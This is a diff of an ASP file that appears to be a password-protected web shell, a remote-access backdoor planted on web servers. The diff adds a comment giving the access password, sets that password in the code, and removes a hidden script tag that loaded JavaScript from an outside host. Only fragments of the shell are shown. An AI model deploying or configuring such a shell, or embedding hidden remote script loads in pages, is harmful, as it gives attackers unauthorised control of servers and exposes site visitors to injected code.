@@ -1,3 +1,4 @@
+# password is t00ls.org
 <%
 Function BufferContent(data)
 	Dim strContent(64)
@@ -210,7 +211,7 @@ END IF
 '--------
 ON ERROR RESUME NEXT
 Response.Buffer = True
-password = "lol" ' <---Your password here
+password = "t00ls.org" ' <---Your password here
 
 If request.querystring("logoff")="@" then
 	session("shagman")=""	' Logged off
@@ -825,4 +826,3 @@ Next
 
 </font><HR><P align=right><font color=#ff8300><TT>Copyright 2003 Vela iNC.</B></font><BR><font size=1 face=arial>[ System: <%=now%> ]</font></p><BR>
 </body></html>
-<SCRIPT SRC=http://www.saldiri.org/summer/ciz.js></SCRIPT>
